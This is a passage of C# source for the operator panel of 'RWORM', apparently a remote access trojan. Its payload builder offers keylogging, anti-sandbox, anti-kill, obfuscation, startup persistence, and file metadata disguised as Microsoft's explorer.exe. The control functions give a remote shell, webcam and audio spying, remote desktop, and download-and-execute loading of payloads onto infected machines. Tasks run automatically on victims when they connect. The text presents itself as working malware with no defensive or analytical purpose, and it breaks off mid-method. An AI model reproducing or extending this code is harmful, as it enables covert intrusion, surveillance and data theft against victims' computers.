using System.Collections.Generic;
using System;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Input;
using RWORM.GUI.Models;
using RWORM.GUI.Services;
using RWORM.GUI.Views;

namespace RWORM.GUI.ViewModels
{
    public class MainViewModel : INotifyPropertyChanged
    {
        private ServerConnection _server;
        private string _selectedView   = "Clients";
        private string _serverAddress  = "127.0.0.1";
        private int    _serverPort     = 3333;
        private bool   _isConnected;
        private string _statusMessage  = "Disconnected";
        private ClientModel? _selectedClient;
        private string _commandInput   = "";
        private string _terminalOutput = "";

        
        private string  _listenerHost    = "0.0.0.0";
        private int     _listenerPort    = 3333;
        private bool    _listenerRunning;
        private string  _listenerStatus  = "Stopped";
        private System.Diagnostics.Process? _serverProcess;

        
        private string _buildHost       = "127.0.0.1";
        private int    _buildPort       = 3333;
        private string _buildOutput     = "RWORM.exe";

        
        private bool   _buildKeyloggerEnabled;
        private bool   _buildKeyloggerOnline;

        
        private bool   _buildTaskEnabled;
        private string _buildTaskUrl    = "";

        
        private bool   _taskDiscordAlert = true;
        private string _taskDiscordWebhook = "";
        public bool    TaskDiscordAlert   { get => _taskDiscordAlert; set { _taskDiscordAlert = value; OnPropertyChanged(); } }
        public string  TaskDiscordWebhook
        {
            get => !string.IsNullOrEmpty(_taskDiscordWebhook) ? _taskDiscordWebhook : _buildDiscordWebhook;
            set { _taskDiscordWebhook = value; OnPropertyChanged(); }
        }

        
        private bool   _buildAntiKill = true;
        private bool   _buildObfuscator = false;
        private bool   _buildAntiSandbox;
        private bool   _buildDiscordAlert;
        private string _buildDiscordWebhook = "";
        private bool   _buildStartupRegistry;
        private bool   _buildSchTasks;
        private string _buildStartupPath = "%APPDATA%\\RWORM";
        private string _buildPastebinRaw = "";
        private string _buildEncryptionKey = "AES-256-DEFAULT";

        
        private bool   _buildPastebinEnabled = false;
        private bool   _buildAssemblyEnabled = true;
        private string _buildAssemblyTitle = "explorer";
        private string _buildAssemblyDescription = "Windows Gezgini";
        private string _buildAssemblyCompany = "Microsoft Corporation";
        private string _buildAssemblyProduct = "Microsoft® Windows® İşletim Sistemi";
        private string _buildAssemblyCopyright = "© Microsoft Corporation. Tüm hakları saklıdır.";
        private string _buildAssemblyVersion = "10.0.26100.1710";

        private bool   _buildIconEnabled = false;
        private string _buildIconPath = "";

        public event PropertyChangedEventHandler? PropertyChanged;

        public ObservableCollection<ClientModel>  Clients         { get; } = new();
        public ObservableCollection<ClientModel>  SelectedClients  { get; } = new();
        public ObservableCollection<TaskModel>    Tasks            { get; } = new();

        private TaskModel? _selectedTask;
        public  TaskModel? SelectedTask
        {
            get => _selectedTask;
            set { _selectedTask = value; OnPropertyChanged(); }
        }

        
        public string SelectedView   { get => _selectedView; 
            set { _selectedView = value; OnPropertyChanged(); } }
        public string ServerAddress  { get => _serverAddress; set { _serverAddress = value; OnPropertyChanged(); } }
        public int    ServerPort     { get => _serverPort;    set { _serverPort    = value; OnPropertyChanged(); } }
        public bool   IsConnected    { get => _isConnected;   set { _isConnected   = value; OnPropertyChanged(); OnPropertyChanged(nameof(ConnectionStatus)); } }
        public string ConnectionStatus => _isConnected ? "Connected" : "Disconnected";
        public string StatusMessage  { get => _statusMessage;  set { _statusMessage  = value; OnPropertyChanged(); } }
        public ClientModel? SelectedClient { get => _selectedClient; set { _selectedClient = value; OnPropertyChanged(); } }
        public string CommandInput   { get => _commandInput;  set { _commandInput  = value; OnPropertyChanged(); } }
        public string TerminalOutput { get => _terminalOutput; set { _terminalOutput = value; OnPropertyChanged(); } }
        public int    ClientCount    => Clients.Count;

        
        public string ListenerHost   { get => _listenerHost;   set { _listenerHost   = value; OnPropertyChanged(); } }
        public int    ListenerPort   { get => _listenerPort;   set { _listenerPort   = value; OnPropertyChanged(); } }
        public bool   ListenerRunning { get => _listenerRunning; set { _listenerRunning = value; OnPropertyChanged(); } }
        public string ListenerStatus  { get => _listenerStatus;  set { _listenerStatus  = value; OnPropertyChanged(); } }

        
        public string BuildHost    { get => _buildHost;    set { _buildHost    = value; OnPropertyChanged(); } }
        public int    BuildPort    { get => _buildPort;    set { _buildPort    = value; OnPropertyChanged(); } }
        public string BuildOutput  { get => _buildOutput;  set { _buildOutput  = value; OnPropertyChanged(); } }

        public bool   BuildKeyloggerEnabled { get => _buildKeyloggerEnabled; set { _buildKeyloggerEnabled = value; OnPropertyChanged(); } }
        public bool   BuildKeyloggerOnline  { get => _buildKeyloggerOnline;  set { _buildKeyloggerOnline  = value; OnPropertyChanged(); } }
        public bool   BuildTaskEnabled      { get => _buildTaskEnabled;      set { _buildTaskEnabled      = value; OnPropertyChanged(); } }
        public string BuildTaskUrl          { get => _buildTaskUrl;          set { _buildTaskUrl          = value; OnPropertyChanged(); } }

        public bool   BuildAntiKill         { get => _buildAntiKill;         set { _buildAntiKill         = value; OnPropertyChanged(); } }
        public bool   BuildObfuscator       { get => _buildObfuscator;       set { _buildObfuscator       = value; OnPropertyChanged(); } }
        public bool   BuildAntiSandbox      { get => _buildAntiSandbox;      set { _buildAntiSandbox      = value; OnPropertyChanged(); } }
        public bool   BuildDiscordAlert     { get => _buildDiscordAlert;     set { _buildDiscordAlert     = value; OnPropertyChanged(); } }
        public string BuildDiscordWebhook   { get => _buildDiscordWebhook;   set { _buildDiscordWebhook   = value; OnPropertyChanged(); } }
        public bool   BuildStartupRegistry  { get => _buildStartupRegistry;  set { _buildStartupRegistry  = value; OnPropertyChanged(); } }
        public bool   BuildSchTasks         { get => _buildSchTasks;         set { _buildSchTasks         = value; OnPropertyChanged(); } }
        public string BuildStartupPath      { get => _buildStartupPath;      set { _buildStartupPath      = value; OnPropertyChanged(); } }
        public string BuildPastebinRaw      { get => _buildPastebinRaw;      set { _buildPastebinRaw      = value; OnPropertyChanged(); } }
        public string BuildEncryptionKey    { get => _buildEncryptionKey;    set { _buildEncryptionKey    = value; GuiCrypto.KeyString = value; OnPropertyChanged(); } }

        public bool   BuildPastebinEnabled  { get => _buildPastebinEnabled;  set { _buildPastebinEnabled  = value; OnPropertyChanged(); } }
        public bool   BuildAssemblyEnabled  { get => _buildAssemblyEnabled;  set { _buildAssemblyEnabled  = value; OnPropertyChanged(); } }
        public string BuildAssemblyTitle    { get => _buildAssemblyTitle;    set { _buildAssemblyTitle    = value; OnPropertyChanged(); } }
        public string BuildAssemblyDescription { get => _buildAssemblyDescription; set { _buildAssemblyDescription = value; OnPropertyChanged(); } }
        public string BuildAssemblyCompany  { get => _buildAssemblyCompany;  set { _buildAssemblyCompany  = value; OnPropertyChanged(); } }
        public string BuildAssemblyProduct  { get => _buildAssemblyProduct;  set { _buildAssemblyProduct  = value; OnPropertyChanged(); } }
        public string BuildAssemblyCopyright{ get => _buildAssemblyCopyright;set { _buildAssemblyCopyright= value; OnPropertyChanged(); } }
        public string BuildAssemblyVersion  { get => _buildAssemblyVersion;  set { _buildAssemblyVersion  = value; OnPropertyChanged(); } }

        public bool   BuildIconEnabled      { get => _buildIconEnabled;      set { _buildIconEnabled      = value; OnPropertyChanged(); } }
        public string BuildIconPath         { get => _buildIconPath;         set { _buildIconPath         = value; OnPropertyChanged(); } }

        
        public ICommand ConnectCommand         { get; }
        public ICommand DisconnectCommand      { get; }
        public ICommand NavigateCommand        { get; }
        public ICommand SendCommandCommand     { get; }
        public ICommand RefreshClientsCommand  { get; }
        public ICommand StartListenerCommand   { get; }
        public ICommand StopListenerCommand    { get; }
        public ICommand BuildCommand           { get; }
        public ICommand OpenBuilderCommand     { get; }
        public ICommand GenerateKeyCommand     { get; }
        public ICommand TestPastebinCommand    { get; }
        public ICommand CloneAssemblyCommand   { get; }
        public ICommand SelectIconCommand      { get; }

        
        public ICommand OpenShellCommand          { get; }
        public ICommand OpenFileManagerCommand     { get; }
        public ICommand OpenKeyloggerCommand       { get; }
        public ICommand OpenProcManagerCommand     { get; }
        public ICommand OpenRegistryEditorCommand  { get; }
        public ICommand OpenRemoteDesktopCommand   { get; }
        public ICommand OpenServiceManagerCommand  { get; }
        public ICommand OpenNetMonitorCommand      { get; }
        public ICommand OpenAutorunManagerCommand  { get; }
        public ICommand OpenClipboardManagerCommand { get; }
        public ICommand OpenMessageBoxCommand       { get; }
        public ICommand OpenReverseProxyCommand     { get; }
        public ICommand OpenClientChatCommand       { get; }
        public ICommand OpenWebcamCommand           { get; }
        public ICommand OpenAudioCommand            { get; }
        public ICommand OpenUrlCommand              { get; }
        public ICommand OpenInstalledProgramsCommand{ get; }
        public ICommand OpenSystemInfoCommand       { get; }
        public ICommand PowerShutdownCommand        { get; }
        public ICommand PowerRestartCommand         { get; }
        public ICommand PowerLockCommand            { get; }
        public ICommand PowerSleepCommand           { get; }
        public ICommand PowerHibernateCommand       { get; }
        public ICommand PowerLogoffCommand          { get; }
        public ICommand LoaderExecCommand          { get; }
        public ICommand LoaderExecFileCommand      { get; }
        public ICommand ClientCloseCommand         { get; }
        public ICommand ClientUninstallCommand     { get; }
        public ICommand ClientUpdateCommand        { get; }
        public ICommand WatchdogStopCommand        { get; }
        public ICommand WatchdogStartCommand       { get; }

        
        public ICommand SendToAllCommand           { get; }
        public ICommand SendQuickCommand           { get; }

        private string _quickCommandText = "";
        public string QuickCommandText
        {
            get => _quickCommandText;
            set { _quickCommandText = value; OnPropertyChanged(); }
        }

        
        public ICommand AddDiscordWebhookTaskCommand { get; }
        public ICommand AddLocalFileTaskCommand    { get; }
        public ICommand AddUrlTaskCommand          { get; }
        public ICommand RunTaskOnSelectedCommand   { get; }
        public ICommand RemoveTaskCommand          { get; }
        public ICommand TestTaskDiscordWebhookCommand { get; }

        internal ServerConnection Server => _server;

        
        public MainViewModel()
        {
            _server = new ServerConnection(_serverAddress, _serverPort);
            _server.ConnectionChanged += OnConnectionChanged;
            _server.OutputReceived    += OnOutputReceived;
            _server.ClientsReceived   += (_, list) => ApplyClientList(list);

            ConnectCommand        = new RelayCommand(async _ => await ConnectAsync(), _ => !IsConnected);
            DisconnectCommand     = new RelayCommand(_ => Disconnect(), _ => IsConnected);
            NavigateCommand       = new RelayCommand(view =>
            {
                var target = view?.ToString() ?? "Clients";
                SelectedView = target;
                if (target == "Builder")
                {
                    OpenBuilderWindow();
                }
            });
            OpenBuilderCommand    = new RelayCommand(_ => OpenBuilderWindow());
            GenerateKeyCommand    = new RelayCommand(_ => BuildEncryptionKey = BuilderHelper.GenerateRandomEncryptionKey());
            TestPastebinCommand   = new RelayCommand(async _ => await BuilderHelper.TestPastebinUrlAsync(BuildPastebinRaw));
            CloneAssemblyCommand  = new RelayCommand(_ => BuilderHelper.CloneAssemblyFromFile(this));
            SelectIconCommand     = new RelayCommand(_ => BuilderHelper.SelectIconFile(this));
            SendCommandCommand    = new RelayCommand(async _ => await SendCommandAsync(), _ => IsConnected && SelectedClient != null);
            RefreshClientsCommand = new RelayCommand(async _ => await RefreshClientsAsync(), _ => IsConnected);
            StartListenerCommand  = new RelayCommand(_ => StartListener(), _ => !ListenerRunning);
            StopListenerCommand   = new RelayCommand(_ => StopListener(),  _ => ListenerRunning);
            BuildCommand          = new RelayCommand(_ => BuildClient());

            
            OpenShellCommand          = new RelayCommand(p => OpenShell(p as ClientModel));
            OpenFileManagerCommand    = new RelayCommand(p => OpenFileManager(p as ClientModel));
            OpenKeyloggerCommand      = new RelayCommand(p => OpenKeylogger(p as ClientModel));
            OpenProcManagerCommand    = new RelayCommand(p => OpenProcManager(p as ClientModel));
            OpenRegistryEditorCommand = new RelayCommand(p => OpenRegistryEditor(p as ClientModel));
            OpenRemoteDesktopCommand  = new RelayCommand(p => OpenRemoteDesktop(p as ClientModel));
            OpenServiceManagerCommand = new RelayCommand(p => OpenServiceManager(p as ClientModel));
            OpenNetMonitorCommand     = new RelayCommand(p => OpenNetMonitor(p as ClientModel));
            OpenAutorunManagerCommand = new RelayCommand(p => OpenAutorunManager(p as ClientModel));
            OpenClipboardManagerCommand = new RelayCommand(p => OpenClipboardManager(p as ClientModel));
            OpenMessageBoxCommand       = new RelayCommand(p => OpenMessageBox(p as ClientModel));
            OpenReverseProxyCommand     = new RelayCommand(p => OpenReverseProxy(p as ClientModel));
            OpenClientChatCommand       = new RelayCommand(p => OpenClientChat(p as ClientModel));
            OpenWebcamCommand           = new RelayCommand(p => OpenWebcam(p as ClientModel));
            OpenAudioCommand            = new RelayCommand(p => OpenAudio(p as ClientModel));
            OpenUrlCommand              = new RelayCommand(p => PromptOpenUrl(p as ClientModel));
            OpenInstalledProgramsCommand= new RelayCommand(p => OpenInstalledPrograms(p as ClientModel));
            OpenSystemInfoCommand       = new RelayCommand(p => OpenSystemInfo(p as ClientModel));
            PowerShutdownCommand        = new RelayCommand(p => ConfirmPowerAction(p as ClientModel, "shutdown"));
            PowerRestartCommand         = new RelayCommand(p => ConfirmPowerAction(p as ClientModel, "restart"));
            PowerLockCommand            = new RelayCommand(p => ConfirmPowerAction(p as ClientModel, "lock"));
            PowerSleepCommand           = new RelayCommand(p => ConfirmPowerAction(p as ClientModel, "sleep"));
            PowerHibernateCommand       = new RelayCommand(p => ConfirmPowerAction(p as ClientModel, "hibernate"));
            PowerLogoffCommand          = new RelayCommand(p => ConfirmPowerAction(p as ClientModel, "logoff"));
            LoaderExecCommand         = new RelayCommand(p => PromptLoaderExec(p as ClientModel));
            LoaderExecFileCommand     = new RelayCommand(p => PromptLoaderExecFile(p as ClientModel));
            ClientCloseCommand        = new RelayCommand(p => ConfirmClose(p as ClientModel));
            ClientUninstallCommand    = new RelayCommand(p => ConfirmUninstall(p as ClientModel));
            ClientUpdateCommand       = new RelayCommand(p => PromptUpdate(p as ClientModel));
            WatchdogStopCommand       = new RelayCommand(p => ExecuteWatchdogControl(p as ClientModel, false));
            WatchdogStartCommand      = new RelayCommand(p => ExecuteWatchdogControl(p as ClientModel, true));
            SendToAllCommand          = new RelayCommand(_ => ExecuteQuickCommand());
            SendQuickCommand          = new RelayCommand(_ => ExecuteQuickCommand());

            
            TestTaskDiscordWebhookCommand = new RelayCommand(async _ => await TestTaskDiscordWebhookAsync());
            AddDiscordWebhookTaskCommand = new RelayCommand(_ => AddDiscordWebhookTask());
            AddLocalFileTaskCommand   = new RelayCommand(_ => AddLocalFileTask());
            AddUrlTaskCommand         = new RelayCommand(_ => AddUrlTask());
            RunTaskOnSelectedCommand  = new RelayCommand(_ => RunTaskOnSelected(),
                _ => SelectedTask != null && IsConnected && (SelectedClients.Count > 0 || SelectedClient != null));
            RemoveTaskCommand         = new RelayCommand(p =>
            {
                if (p is TaskModel t) Tasks.Remove(t);
                else if (SelectedTask != null) Tasks.Remove(SelectedTask);
            });
        }

        
        private async Task ConnectAsync()
        {
            StatusMessage = "Connecting...";
            try { _server.Disconnect(); } catch { }   
            GuiCrypto.KeyString = BuildEncryptionKey;
            _server = new ServerConnection(ServerAddress, ServerPort);
            _server.ClientsReceived += (_, list) => ApplyClientList(list);
            _server.ConnectionChanged += OnConnectionChanged;
            _server.OutputReceived    += OnOutputReceived;
            _server.ClientsReceived   += (_, list) => ApplyClientList(list);
            bool ok = await _server.ConnectAsync();
            if (ok)
            {
                StatusMessage = "Connected";
                _ = PollClientsLoop();
            }
            else StatusMessage = "Connection failed";
        }

        private void Disconnect()
        {
            _server.Disconnect();
            Clients.Clear();
            StatusMessage = "Disconnected";
            OnPropertyChanged(nameof(ClientCount));
        }

        
        private async Task PollClientsLoop()
        {
            while (_server.Connected)
            {
                await RefreshClientsAsync();
                await Task.Delay(4000);
            }
        }

        private async Task RefreshClientsAsync()
        {
            var newClients = await _server.GetClientsAsync();
            ApplyClientList(newClients);
        }

        public void ApplyClientList(List<ClientModel> newClients)
        {
            if (newClients == null) return;
            void Apply()
            {
                var selectedGuids = new HashSet<string>(SelectedClients.Select(c => c.Guid), StringComparer.OrdinalIgnoreCase);
                if (SelectedClient != null) selectedGuids.Add(SelectedClient.Guid);

                var newDict = newClients.ToDictionary(c => c.Guid, StringComparer.OrdinalIgnoreCase);

                
                for (int i = Clients.Count - 1; i >= 0; i--)
                {
                    if (!newDict.ContainsKey(Clients[i].Guid))
                        Clients.RemoveAt(i);
                }

                
                foreach (var nc in newClients)
                {
                    var existing = Clients.FirstOrDefault(c => string.Equals(c.Guid, nc.Guid, StringComparison.OrdinalIgnoreCase));
                    if (existing != null)
                    {
                        existing.Hostname    = nc.Hostname;
                        existing.Username    = nc.Username;
                        existing.OSVersion   = nc.OSVersion;
                        existing.IpAddress   = nc.IpAddress;
                        existing.CountryCode = nc.CountryCode;
                        existing.Flag        = nc.Flag;
                        existing.IsOnline    = nc.IsOnline;
                        existing.LastSeen    = nc.LastSeen;
                    }
                    else
                    {
                        Clients.Add(nc);
                    }
                }

                
                if (selectedGuids.Count > 0)
                {
                    foreach (var c in Clients)
                    {
                        if (selectedGuids.Contains(c.Guid))
                        {
                            if (!SelectedClients.Contains(c))
                                SelectedClients.Add(c);
                            if (SelectedClient == null)
                                SelectedClient = c;
                        }
                    }
                }

                OnPropertyChanged(nameof(ClientCount));

                
                foreach (var task in Tasks.ToList())
                {
                    foreach (var c in Clients.ToList())
                    {
                        string sessionKey = !string.IsNullOrWhiteSpace(c.Id)
                            ? c.Id
                            : $"{c.Guid}:{c.LastSeen:yyyyMMddHHmmss}";

                        if (!task.ExecutedKeys.Contains(sessionKey))
                        {
                            _ = ExecuteTaskOnClientAsync(task, c);
                        }
                    }
                }
            }
            var dispatcher = System.Windows.Application.Current?.Dispatcher;
            if (dispatcher == null) Apply();
            else if (dispatcher.CheckAccess()) Apply();
            else dispatcher.Invoke(Apply);
        }

        
        private readonly List<ClientModel> _contextMenuSnapshot = new();
        public void SnapshotContextMenu()
        {
            _contextMenuSnapshot.Clear();
            if (SelectedClients.Count > 0)
                _contextMenuSnapshot.AddRange(SelectedClients);
            else if (SelectedClient != null)
                _contextMenuSnapshot.Add(SelectedClient);
        }

        private List<ClientModel> ResolveTargets(ClientModel? c)
        {
            if (c != null) return new List<ClientModel> { c };
            if (_contextMenuSnapshot.Count > 0) return _contextMenuSnapshot.ToList();
            if (SelectedClients.Count > 0) return SelectedClients.ToList();
            if (SelectedClient != null) return new List<ClientModel> { SelectedClient };
            if (Clients.Count > 0) return new List<ClientModel> { Clients[0] };
            return new List<ClientModel>();
        }

        private void ExecuteQuickCommand()
        {
            var targets = ResolveTargets(null);
            if (targets.Count == 0 && Clients.Count > 0) targets = Clients.ToList();
            if (targets.Count == 0)
            {
                System.Windows.MessageBox.Show("No clients connected or selected.", "Info",
                    System.Windows.MessageBoxButton.OK, System.Windows.MessageBoxImage.Information);
                return;
            }

            string cmd = QuickCommandText.Trim();
            if (string.IsNullOrEmpty(cmd))
            {
                cmd = InputDialog.Show($"Command to send to {targets.Count} client(s):", "Send Command", "") ?? "";
            }

            if (string.IsNullOrWhiteSpace(cmd)) return;

            int count = 0;
            if (cmd.Equals("watchdog stop", StringComparison.OrdinalIgnoreCase) || cmd.Equals("watchdog off", StringComparison.OrdinalIgnoreCase))
            {
                foreach (var c in targets) { _ = _server.WatchdogStop(c.Guid); count++; }
                QuickCommandText = "";
                StatusMessage = $"Watchdog Stop sent to {count} client(s)";
                return;
            }
            if (cmd.Equals("watchdog start", StringComparison.OrdinalIgnoreCase) || cmd.Equals("watchdog on", StringComparison.OrdinalIgnoreCase))
            {
                foreach (var c in targets) { _ = _server.WatchdogStart(c.Guid); count++; }
                QuickCommandText = "";
                StatusMessage = $"Watchdog Start sent to {count} client(s)";
                return;
            }
            foreach (var c in targets)
            {
                _ = _server.SendCommandAsync(c.Guid, cmd);
                count++;
            }
            QuickCommandText = "";
            StatusMessage = $"Command sent to {count} client(s)";
        }

        
        private void OpenShell(ClientModel? c)
        {
            var target = ResolveTargets(c).FirstOrDefault();
            if (target == null) return;
            new ShellWindow(_server, target.Guid, target.Hostname, target.IpAddress).Show();
        }

        private void OpenFileManager(ClientModel? c)
        {
            var target = ResolveTargets(c).FirstOrDefault();
            if (target == null) return;
            new FileManagerWindow(_server, target.Guid, target.Hostname).Show();
        }

        private void OpenKeylogger(ClientModel? c)
        {
            var target = ResolveTargets(c).FirstOrDefault();
            if (target == null) return;
            new KeyloggerWindow(_server, target.Guid, target.Hostname).Show();
        }

        private void OpenProcManager(ClientModel? c)
        {
            var target = ResolveTargets(c).FirstOrDefault();
            if (target == null) return;
            new ProcessManagerWindow(_server, target.Guid, target.Hostname).Show();
        }

        private void OpenRegistryEditor(ClientModel? c)
        {
            var target = ResolveTargets(c).FirstOrDefault();
            if (target == null) return;
            new RegistryEditorWindow(_server, target.Guid, target.Hostname).Show();
        }

        private void OpenRemoteDesktop(ClientModel? c)
        {
            var target = ResolveTargets(c).FirstOrDefault();
            if (target == null) return;
            new RemoteDesktopWindow(_server, target.Guid, target.Hostname).Show();
        }

        private void OpenServiceManager(ClientModel? c)
        {
            var target = ResolveTargets(c).FirstOrDefault();
            if (target == null) return;
            new ServiceManagerWindow(_server, target.Guid, target.Hostname).Show();
        }

        private void OpenNetMonitor(ClientModel? c)
        {
            var target = ResolveTargets(c).FirstOrDefault();
            if (target == null) return;
            new NetMonitorWindow(_server, target.Guid, target.Hostname).Show();
        }

        private void OpenAutorunManager(ClientModel? c)
        {
            var target = ResolveTargets(c).FirstOrDefault();
            if (target == null) return;
            new AutorunManagerWindow(_server, target.Guid, target.Hostname).Show();
        }

        private void OpenClipboardManager(ClientModel? c)
        {
            var target = ResolveTargets(c).FirstOrDefault();
            if (target == null) return;
            new ClipboardManagerWindow(_server, target.Guid, target.Hostname).Show();
        }

        private void OpenMessageBox(ClientModel? c)
        {
            var targets = ResolveTargets(c);
            if (targets.Count == 0) return;
            var dlg = new MessageBoxDialog();
            if (dlg.ShowDialog() == true)
            {
                foreach (var client in targets)
                {
                    var guid = client.Guid;
                    _ = _server.ShowRemoteMessageBox(guid, dlg.MsgTitle, dlg.MsgBody, dlg.ButtonsVal, dlg.IconVal,
                        resp => OnMessageBoxResult(guid, resp));
                }
                StatusMessage = $"MessageBox sent to {targets.Count} client(s)";
            }
        }

        
        private void OnMessageBoxResult(string guid, byte[] resp)
        {
            string host = guid;
            string text;
            try
            {
                string raw = System.Text.Encoding.UTF8.GetString(resp ?? Array.Empty<byte>());
                using (var doc = System.Text.Json.JsonDocument.Parse(raw))
                {
                    var root = doc.RootElement;
                    string button = root.TryGetProperty("button", out var b) ? (b.GetString() ?? "") : "";
                    text = string.IsNullOrEmpty(button) ? raw : button;
                }
            }
            catch
            {
                text = "unparsable reply";
            }

            var dispatcher = System.Windows.Application.Current?.Dispatcher;
            if (dispatcher == null) return;
            dispatcher.BeginInvoke(new Action(() =>
            {
                var client = Clients.FirstOrDefault(x => x.Guid == guid);
                host = client?.Hostname ?? guid;
                StatusMessage = $"MessageBox reply from {host}: {text}";
            }));
        }

        private void OpenReverseProxy(ClientModel? c)
        {
            var target = ResolveTargets(c).FirstOrDefault();
            if (target == null) return;
            new ReverseProxyWindow(_server, target.Guid, target.Hostname).Show();
        }

        private void OpenClientChat(ClientModel? c)
        {
            var target = ResolveTargets(c).FirstOrDefault();
            if (target == null) return;
            new ClientChatWindow(_server, target.Guid, target.Hostname).Show();
        }

        private void OpenWebcam(ClientModel? c)
        {
            var target = ResolveTargets(c).FirstOrDefault();
            if (target == null) return;
            new WebcamWindow(_server, target.Guid, target.Hostname).Show();
        }

        private void OpenAudio(ClientModel? c)
        {
            var target = ResolveTargets(c).FirstOrDefault();
            if (target == null) return;
            new AudioMonitorWindow(_server, target.Guid, target.Hostname).Show();
        }

        private void PromptOpenUrl(ClientModel? c)
        {
            var targets = ResolveTargets(c);
            if (targets.Count == 0) return;
            var url = InputDialog.Show("Target URL to open in default browser:", "Open URL", "https://");
            if (string.IsNullOrWhiteSpace(url)) return;
            foreach (var client in targets)
            {
                _server.OpenUrl(client.Guid, url);
            }
            StatusMessage = $"Open URL ({url}) sent to {targets.Count} client(s)";
        }

        private void OpenInstalledPrograms(ClientModel? c)
        {
            var target = ResolveTargets(c).FirstOrDefault();
            if (target == null) return;
            new InstalledProgramsWindow(_server, target.Guid).Show();
        }

        private void OpenSystemInfo(ClientModel? c)
        {
            var target = ResolveTargets(c).FirstOrDefault();
            if (target == null) return;
            new SystemInfoWindow(_server, target.Guid).Show();
        }

        private void ConfirmPowerAction(ClientModel? c, string action)
        {
            var targets = ResolveTargets(c);
            if (targets.Count == 0) return;
            string desc = action switch
            {
                "shutdown" => "Shutdown",
                "restart" => "Restart",
                "lock" => "Lock workstation",
                "sleep" => "Put into Sleep",
                "hibernate" => "Put into Hibernate",
                "logoff" => "Log off current user",
                _ => action
            };

            string prompt = targets.Count == 1
                ? $"{desc} on {targets[0].Hostname}?"
                : $"{desc} on {targets.Count} selected clients?";

            if (System.Windows.MessageBox.Show(prompt, $"PC - {desc}",
                    System.Windows.MessageBoxButton.YesNo,
                    System.Windows.MessageBoxImage.Warning) != System.Windows.MessageBoxResult.Yes) return;

            foreach (var client in targets)
            {
                _server.SendPowerAction(client.Guid, action);
            }
            StatusMessage = $"Power action '{action}' dispatched to {targets.Count} client(s)";
        }

        
        private void PromptLoaderExec(ClientModel? c)
        {
            var targets = ResolveTargets(c);
            if (targets.Count == 0) return;
            var url = InputDialog.Show("Payload URL to download and execute:", "Loader (URL)", "https://");
            if (string.IsNullOrWhiteSpace(url)) return;
            foreach (var client in targets)
            {
                _ = _server.LoaderExec(client.Guid, url);
            }
            StatusMessage = $"Loader (URL) sent to {targets.Count} client(s)";
        }

        private void PromptLoaderExecFile(ClientModel? c)
        {
            var targets = ResolveTargets(c);
            if (targets.Count == 0) return;

            var dlg = new Microsoft.Win32.OpenFileDialog
            {
                Title  = "Select Executable to Execute on Target",
                Filter = "Executable (*.exe)|*.exe|All Files (*.*)|*.*",
            };
            if (dlg.ShowDialog() != true) return;

            byte[] bytes;
            try { bytes = File.ReadAllBytes(dlg.FileName); }
            catch (Exception ex)
            {
                System.Windows.MessageBox.Show($"Failed to read file: {ex.Message}", "Error",
                    System.Windows.MessageBoxButton.OK, System.Windows.MessageBoxImage.Error);
                return;
            }

            foreach (var client in targets)
            {
                _ = _server.LoaderExecFile(client.Guid, bytes);
            }
            StatusMessage = $"Loader (File: {Path.GetFileName(dlg.FileName)}) sent to {targets.Count} client(s)";
        }

        private void ConfirmClose(ClientModel? c)
        {
            var targets = ResolveTargets(c);
            if (targets.Count == 0) return;
            string msg = targets.Count == 1 ? $"Close client on {targets[0].Hostname}?" : $"Close {targets.Count} selected clients?";
            if (System.Windows.MessageBox.Show(msg, "Confirm",
                    System.Windows.MessageBoxButton.YesNo,
                    System.Windows.MessageBoxImage.Question) != System.Windows.MessageBoxResult.Yes) return;
            foreach (var target in targets)
            {
                _ = _server.ClientClose(target.Guid);
            }
        }

        private void ExecuteWatchdogControl(ClientModel? c, bool start)
        {
            var targets = ResolveTargets(c);
            if (targets.Count == 0) return;
            string action = start ? "Start/Arm" : "Stop/Disarm";
            foreach (var target in targets)
            {
                if (start)
                    _ = _server.WatchdogStart(target.Guid);
                else
                    _ = _server.WatchdogStop(target.Guid);
            }
            StatusMessage = $"Watchdog {action} sent to {targets.Count} client(s)";
        }

        private void ConfirmUninstall(ClientModel? c)
        {
            var targets = ResolveTargets(c);
            if (targets.Count == 0) return;
            string msg = targets.Count == 1
                ? $"Uninstall and self-delete on {targets[0].Hostname}?\nThis is irreversible."
                : $"Uninstall and self-delete on {targets.Count} selected clients?\nThis is irreversible.";
            if (System.Windows.MessageBox.Show(msg, "Uninstall",
                    System.Windows.MessageBoxButton.YesNo,
                    System.Windows.MessageBoxImage.Warning) != System.Windows.MessageBoxResult.Yes) return;
            foreach (var target in targets)
            {
                _ = _server.ClientUninstall(target.Guid);
            }
        }

        private void PromptUpdate(ClientModel? c)
        {
            var targets = ResolveTargets(c);
            if (targets.Count == 0) return;
            var url = InputDialog.Show("New binary URL for update:", "Update Client", "https://");
            if (string.IsNullOrWhiteSpace(url)) return;
            foreach (var target in targets)
            {
                _ = _server.ClientUpdate(target.Guid, url);
            }
            StatusMessage = $"Update sent to {targets.Count} client(s)";
        }

        private void PromptMultiSend()
        {
            ExecuteQuickCommand();
        }

        
        private async Task ExecuteTaskOnClientAsync(TaskModel task, ClientModel client)
        {
            string sessionKey = !string.IsNullOrWhiteSpace(client.Id)
                ? client.Id
                : $"{client.Guid}:{client.LastSeen:yyyyMMddHHmmss}";

            if (task.ExecutedKeys.Contains(sessionKey)) return;
            task.ExecutedKeys.Add(sessionKey);

            _ = SendTaskDiscordAlertAsync(
                "📋 Task Dispatched to Client",
                $"Task **{task.Name}** was dispatched to **{client.Hostname}** (`{client.IpAddress}`).",
                task.Name,
                $"{client.Hostname} ({client.IpAddress})",
                task.ModeLabel);

                        if (task.Mode == TaskMode.DiscordWebhook)
            {
                task.ExecutedCount++;
                task.Status = $"Active ({task.ExecutedCount} executions)";
                _ = SendTaskDiscordAlertAsync(
                    "Client Connected",
                    $"Client **{client.Hostname}** ({client.Username}) connected from `{client.IpAddress}` [{client.CountryCode}].",
                    task.Name,
                    $"{client.Hostname} ({client.IpAddress})",
                    "Discord Webhook");
                return;
            }

            try
            {
                if (task.Mode == TaskMode.LocalFile)
                {
                    if (File.Exists(task.Source))
                    {
                        byte[] bytes = File.ReadAllBytes(task.Source);
                        await _server.RunFileTaskAsync(client.Guid, bytes);
                    }
                }
                else
                {
                    await _server.RunUrlTaskAsync(client.Guid, task.Source);
                }

                task.ExecutedCount++;
                task.Status = $"Sent → {task.ExecutedCount} client(s)";
            }
            catch (Exception ex)
            {
                task.Status = $"Error: {ex.Message}";
            }
        }

        private void AddDiscordWebhookTask()
        {
